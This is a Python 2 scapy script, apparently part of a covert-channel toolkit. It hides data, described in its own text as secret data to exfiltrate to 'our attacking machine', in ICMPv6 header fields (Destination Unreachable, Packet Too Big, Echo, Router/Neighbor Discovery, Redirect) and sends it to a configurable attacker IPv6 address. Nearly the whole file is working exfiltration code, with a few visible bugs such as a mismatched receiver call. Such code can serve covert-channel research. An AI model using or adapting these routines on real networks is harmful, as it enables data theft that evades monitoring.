#!/usr/bin/python

import sys
import re, uuid
import os
import readline
from pprint import pprint
from commands import *
from scapy.all import *
from receiver import *
from bitstring import *

"""
This class is for testing all covert channels in one
"""
class AllTests:

    def __init__(self, iface):
        self.dataToExfilt = 'this is the super secret data to exfiltrate to our attacking machine\n'        
        self.ipAddress = 'fe80::ad4:cff:fe13:7667'
        self.iface = iface
        self.name = 'AllCovertTests'

    def startSystem(self):
        Commands.setAllCovertTestHistory()
        running = 1
        while running:
            readline.parse_and_bind("tab: complete")
            #we receive data from the keyboard                    
            command  = raw_input(self.name + ' >>')
            #help command
            if re.match('help', command):
                self.showHelp()
            #quit module command
            elif re.match('quit', command):
                running = 0
                Commands.setCovertChannelHistory()
            elif re.match('setAdr', command):
                self.ipAddress = re.sub('setAdr', ' ', command).lstrip()
                print 'setting Ip address: ' + self.ipAddress
            elif re.match('exec', command):
                dest = DestinationUnreachableCovert()
                dest.execModule(self.dataToExfilt, self.iface, self.ipAddress)
                big = PacketTooBigCovert()
                big.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                big.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                ## time = TimeExceededCovert()
                ## time.execModule(self.dataToExfilt, self.iface, self.ipAddress)
                ## param = ParameterProblemCovert()
                ## param.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                ## param.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                ## echoReq = EchoRequestCovert()
                ## echoReq.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                ## echoReq.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                ## echoReq.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                ## echoReq.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                ## echoRep = EchoReplyCovert()
                ## echoRep.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                ## echoRep.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                ## echoRep.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                ## echoRep.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                ## routerSol = RouterSolicitationCovert()
                ## routerSol.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                ## routerSol.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                ## #only tested 8 bit or more (no M,O,Reserved)
                ## routerAdv = RouterAdvertisementCovert()
                ## routerAdv.execModule(self.dataToExfilt, '', '', '', '', '', '', '', self.iface, self.ipAddress)
                ## routerAdv.execModule('', self.dataToExfilt, '', '', '', '', '', '', self.iface, self.ipAddress)
                ## #reachable time error
                ## #routerAdv.execModule('', '', '', '', '', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                ## routerAdv.execModule('', '', '', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                ## routerAdv.execModule('', '', '', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)                
                ## neighbSol = NeighborSolicitationCovert()
                ## neighbSol.execModule(self.dataToExfilt, '', '', self.iface, self.ipAddress)
                ## neighbSol.execModule('', self.dataToExfilt, '', self.iface, self.ipAddress)
                ## #target address requires socket.AF_INET6 type
                ## #neighbSol.execModule('', '', self.dataToExfilt, self.iface, self.ipAddress)                
                ## #only tested 8 bit or more (no R,S,O)
                ## neighbAdv = NeighborAdvertisementCovert()
                ## neighbAdv.execModule(self.dataToExfilt, '', '', '', '', '', self.iface, self.ipAddress)
                ## neighbAdv.execModule('', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                ## #target address requires socket.AF_INET6 type
                ## #neighbAdv.execModule('', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                ## redirect = RedirectCovert()
                ## redirect.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                ## redirect.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                ## #target address requires socket.AF_INET6 type
                ## #redirect.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                ## #destination address requires socket.AF_INET6 type
                ## #redirect.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                
            elif re.match('rec', command):
                HelperClass.receiver(self.ipAddress)

    def showHelp(self):
        for entry in Help.getAllCovertTestHelp():
            print entry
                
class DestinationUnreachableCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.nameCode = 'Destination Unreachable code: '
         
    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(code=chunk)
        
    def execModule(self, dataCode, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
            sendingBuffer = []

        
class PacketTooBigCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthMtu = 4
        self.nameCode = 'Packet Too Big code: '
        self.nameMtu = 'Packet Too Big MTU: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(code=chunk)

    def buildPacketMtu(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(mtu=chunk)
        
    def execModule(self, dataCode, dataMtu, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataMtu:
            data = self.nameMtu+dataMtu
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthMtu)
            for chunk in sendingBuffer:
                self.buildPacketMtu(chunk, ipAdr)
                send(self.packet, iface=exitIface)            

class TimeExceededCovert:

    def __init__(self):
        self.bandwidth = 1
        self.name = 'Time Exceeded code: '

    def buildPacket(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(code=chunk)
        
    def execModule(self, data, exitIface, ipAdr):
        data = self.name+data
        sendingBuffer = HelperClass.chunkPackets(data, self.bandwidth)
        for chunk in sendingBuffer:
            self.buildPacket(chunk, ipAdr)
            send(self.packet, iface=exitIface)
        
class ParameterProblemCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthPointer = 1
        self.nameCode = 'Parameter Problem code: '
        self.namePointer = 'Parameter Problem pointer: '
        
    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(code=chunk)

    def buildPacketPointer(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(ptr=chunk)

    def execModule(self, dataCode, dataPointer, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataPointer:
            data = self.namePointer+dataPointer
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPointer)
            for chunk in sendingBuffer:
                self.buildPacketPointer(chunk, ipAdr)
                send(self.packet, iface=exitIface)
                
        
class EchoRequestCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthId = 1
        self.bandwidthSeq = 1
        self.bandwidthData = 1
        self.nameCode = 'Echo Request code: '
        self.nameId = 'Echo Request identifier: '
        self.nameSeq = 'Echo Request sequence number: '
        self.nameData = 'Echo Request data: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(code=chunk)

    def buildPacketId(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(id=chunk)

    def buildPacketSeq(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(seq=chunk)

    def buildPacketData(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(data=chunk)

    def execModule(self, dataCode, dataId, dataSeq, dataData, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataId:
            data = self.nameId+dataId
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthId)
            for chunk in sendingBuffer:
                self.buildPacketId(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataSeq:
            data = self.nameSeq+dataSeq
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthSeq)
            for chunk in sendingBuffer:
                self.buildPacketSeq(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataData:
            data = self.nameData+dataData
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthData)
            for chunk in sendingBuffer:
                self.buildPacketData(chunk, ipAdr)
                send(self.packet, iface=exitIface)
                
        
class EchoReplyCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthId = 1
        self.bandwidthSeq = 1
        self.bandwidthData = 1
        self.nameCode = 'Echo Reply code: '
        self.nameId = 'Echo Reply identifier: '
        self.nameSeq = 'Echo Reply sequence number: '
        self.nameData = 'Echo Reply data: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(code=chunk)

    def buildPacketId(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(id=chunk)

    def buildPacketSeq(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(seq=chunk)

    def buildPacketData(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(data=chunk)

    def execModule(self, dataCode, dataId, dataSeq, dataData, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataId:
            data = self.nameId+dataId
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthId)
            for chunk in sendingBuffer:
                self.buildPacketId(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataSeq:
            data = self.nameSeq+dataSeq
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthSeq)
            for chunk in sendingBuffer:
                self.buildPacketSeq(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataData:
            data = self.nameData+dataData
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthData)
            for chunk in sendingBuffer:
                self.buildPacketData(chunk, ipAdr)
                send(self.packet, iface=exitIface)
            
        
class RouterSolicitationCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthRes = 1
        self.nameCode = 'Router Solicitation code: '
        self.nameRes = 'Router Solicitation reserved: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RS(code=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RS(res=chunk)

    def execModule(self, dataCode, dataRes, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface)
                
        
class RouterAdvertisementCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthCurHopLimit = 1
        self.bandwidthM = 1
        self.bandwidthO = 1
        self.bandwidthRes = 1
        self.bandwidthRouterLifeTime = 1
        self.bandwidthReachTime = 1
        self.bandwidthRetransTimer = 1
        self.nameCode = 'Router Advertisement code: '
        self.nameCurHopLimit = 'Router Advertisement Cur Hop LImit: '
        self.nameM = 'Router Advertisement M: '
        self.nameO = 'Router Advertisement O: '
        self.nameRes = 'Router Advertisement reserved: '
        self.nameRouterLifeTime = 'Router Advertisement router life time: '
        self.nameReachTime = 'Router Advertisement reachable time: '
        self.nameRetransTimer = 'Router Advertisement retrans timer: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(code=chunk)

    def buildPacketCurHopLimit(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(chlim=chunk)

    def buildPacketM(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(M=chunk)

    def buildPacketO(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(O=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(res=chunk)

    def buildPacketRouterLifeTime(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(routerlifetime=chunk)

    def buildPacketReachTime(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(reachabletime=chunk)

    def buildPacketRetransTimer(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(retranstimer=chunk)
        
    def execModule(self, dataCode, dataChlim, dataM, dataO, dataRes, dataRouterLifeTime, dataReachTime, dataRetransTimer, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataChlim:
            data = self.nameCurHopLimit+dataChlim
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCurHopLimit)
            for chunk in sendingBuffer:
                self.buildPacketCurHopLimit(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataM:
            data = self.nameM+dataM
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthM)
            for chunk in sendingBuffer:
                self.buildPacketM(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataO:
            data = self.nameO+dataO
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthO)
            for chunk in sendingBuffer:
                self.buildPacketO(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRouterLifeTime:
            data = self.nameRouterLifeTime+dataRouterLifeTime
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRouterLifeTime)
            for chunk in sendingBuffer:
                self.buildPacketRouterLifeTime(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataReachTime:
            data = self.nameReachTime+dataReachTime
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthReachTime)
            for chunk in sendingBuffer:
                self.buildPacketReachTime(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRetransTimer:
            data = self.nameRetransTimer+dataRetransTimer
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRetransTimer)
            for chunk in sendingBuffer:
                self.buildPacketRetransTimer(chunk, ipAdr)
                send(self.packet, iface=exitIface)
                
        
class NeighborSolicitationCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthRes = 1
        self.bandwidthTargetAdr = 1
        self.nameCode = 'Neighbor Solicitation code: '
        self.nameRes = 'Neighbor Solicitation reserved: '
        self.nameTargetAdr = 'Neighbor Solicitation target address: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS(code=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS(res=chunk)

    def buildPacketTargetAdr(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS(tgt=chunk)        

    def execModule(self, dataCode, dataRes, dataTargetAdr, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataTargetAdr:
            data = self.nameTargetAdr+dataTargetAdr
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthTargetAdr)
            for chunk in sendingBuffer:
                self.buildPacketTargetAdr(chunk, ipAdr)
                send(self.packet, iface=exitIface)                

                
class NeighborAdvertisementCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthR = 1
        self.bandwidthS = 1        
        self.bandwidthO = 1
        self.bandwidthRes = 1
        self.bandwidthTargetAddress = 1
        self.nameCode = 'Neighbor Advertisement code: '
        self.nameR = 'Neighbor Advertisement R: '
        self.nameS = 'Neighbor Advertisement S: '
        self.nameO = 'Neighbor Advertisement O: '        
        self.nameRes = 'Neighbor Advertisement reserved: '
        self.nameTargetAddress = 'Neighbor Advertisement target address: '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(code=chunk)

    def buildPacketR(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(R=chunk)

    def buildPacketS(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(S=chunk)

    def buildPacketO(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(O=chunk)        

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(res=chunk)

    def buildPacketTargetAddress(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(tgt=chunk)
        
    def execModule(self, dataCode, dataR, dataS, dataO, dataRes, dataTargetAddress, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataR:
            data = self.nameR+dataR
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthR)
            for chunk in sendingBuffer:
                self.buildPacketR(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataS:
            data = self.nameS+dataS
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthS)
            for chunk in sendingBuffer:
                self.buildPacketS(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataO:
            data = self.nameO+dataO
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthO)
            for chunk in sendingBuffer:
                self.buildPacketO(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataTargetAddress:
            data = self.nameTargetAddress+dataTargetAddress
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthTargetAddress)
            for chunk in sendingBuffer:
                self.buildPacketTargetAddress(chunk, ipAdr)
                send(self.packet, iface=exitIface)

        
class RedirectCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthRes = 1
        self.bandwidthTargetAdr = 1
        self.bandwidthDestAdr = 1        
        self.nameCode = 'Redirect code: '
        self.nameRes = 'Redirect reserved: '
        self.nameTargetAdr = 'Redirect target address: '
        self.nameDestAdr = 'Redirect destination address: '        

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(code=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(res=chunk)

    def buildPacketTargetAdr(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(tgt=chunk)        

    def buildPacketDestAdr(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(tgt=chunk)        
        
    def execModule(self, dataCode, dataRes, dataTargetAdr, dataDestAdr, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataTargetAdr:
            data = self.nameTargetAdr+dataTargetAdr
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthTargetAdr)
            for chunk in sendingBuffer:
                self.buildPacketTargetAdr(chunk, ipAdr)
                send(self.packet, iface=exitIface)
        elif dataDestAdr:
            data = self.nameDestAdr+dataDestAdr
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthDestAdr)
            for chunk in sendingBuffer:
                self.buildPacketDestAdr(chunk, ipAdr)
                send(self.packet, iface=exitIface)                

                
class HelperClass:

    @classmethod
    def chunkPackets(self, data, maxPacketSize):
        print '[*] bandwidth %d' % maxPacketSize
        sendingBuffer = []
        tmpBuffer = 0
        print '[*] size of file %d' % len(data)
        if len(data) <= maxPacketSize:
            print 'ZZZZZZZZZZZZZZZZZZZXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
            sendingBuffer.append(data)
        else:
            chunksNumber = int(len(data)/maxPacketSize)
            chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
            for tmpChunk in chunks:
                tmpBit = BitArray()
                print tmpBit
                for c in tmpChunk:
                    bit = BitArray(uint=ord(c), length=8)
                    tmpBit.append(bit)
                print tmpBit.bin
                sendingBuffer.append(int(tmpBit.bin, 2))
            chunkNumber = 0
            for entry in chunks:
                #sendingBuffer.append(entry)
                chunkNumber += 1
        print '[*] chunks %d' % chunkNumber
        print sendingBuffer
        return sendingBuffer

    @classmethod
    def receiver(self, iface, adr):
        rec = Receiver(iface, adr)
        rec.receive()
